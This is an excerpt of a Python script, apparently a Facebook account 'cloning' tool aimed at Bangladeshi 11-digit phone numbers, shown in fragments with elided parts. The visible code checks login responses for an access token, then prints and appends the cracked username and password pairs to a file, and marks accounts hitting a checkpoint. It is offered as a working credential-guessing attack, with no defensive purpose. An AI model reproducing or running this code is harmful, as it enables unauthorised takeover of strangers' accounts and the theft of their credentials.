...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO IQUBAL420 -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
logo = '\x1b[1;96m--------------------------------------------------\n      ---> Create to by -> IQUBAL SARKAR <--- \n\x1b[1;96m-------------------------------------------------- \n\x1b[1;96m     Facebook  -> sarkar.saheb420 \x1b[00m\n\x1b[1;96m--------------------------------------------------\n    ---> Github -> IQUBAL420 <--- \n\x1b[1;96m--------------------------------------------------'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SARKAR_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[SARKAR_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
